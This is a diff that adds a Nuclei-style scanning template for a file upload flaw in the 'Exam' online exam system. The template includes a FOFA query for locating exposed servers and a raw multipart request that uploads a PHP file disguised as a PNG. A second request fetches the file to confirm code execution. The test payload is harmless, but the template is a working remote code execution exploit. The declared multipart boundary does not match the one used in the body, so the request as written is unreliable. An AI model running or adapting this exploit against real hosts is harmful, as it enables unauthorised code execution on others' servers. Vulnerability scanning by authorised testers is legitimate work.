@@ -1,0 +1,44 @@
+id: exam-online-system-file-upload
+
+info:
+  name: "Exam在线考试系统 files.cls.php 文件上传逻辑缺陷"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa:"app/core/styles/js/jquery.min.js"
+      
+      Exam在线考试系统在 /lib/files.cls.php 路径中定义的 uploadFile 类存在文件上传处理逻辑缺陷。该组件通过 uploadFile 方法实现文件存储功能，但未有效校验上传文件的类型与内容，导致攻击者可构造恶意文件通过该接口实施代码执行攻击。
+      
+  tags: Exam在线考试系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /index.php?document-api-fineuploader HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygfd0H3RWDeNNLaPy
+    Connection: keep-alive
+
+    ------WebKitFormBoundarye776qKJKlcGtVlH5
+    Content-Disposition: form-data; name="qqfile"; filename="NTest.php"
+    Content-Type: image/png
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundarye776qKJKlcGtVlH5--
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
+  - type: status
+    status:
+    - 200
